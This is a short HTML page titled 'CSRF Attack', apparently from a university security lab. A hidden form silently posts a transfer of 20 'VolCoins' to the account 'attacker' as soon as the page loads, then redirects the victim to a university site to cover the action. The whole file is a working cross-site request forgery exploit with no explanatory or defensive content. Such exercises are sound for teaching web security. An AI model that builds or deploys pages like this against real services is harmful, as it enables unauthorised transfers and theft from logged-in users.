<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack</title>
</head>
<body>
    <h3>Transfer VolCoins</h3>
    <form class="pure-form pure-form-stacked" action="/post_transfer" method="post">
        <input type="hidden" name="destination_username" value="attacker">
        <input type="hidden" name="quantity" value="20">
        <button id="transferButton">Transfer</button>
    </form>
    <script>
        window.onload = function() {
            document.getElementById("transferButton").click(); // Submit the form
            setTimeout(function(){
                window.location.href = "https://eecs.utk.edu/";
            }, 1000); // Redirect after 1 second
        }
    </script>
</body>
</html>
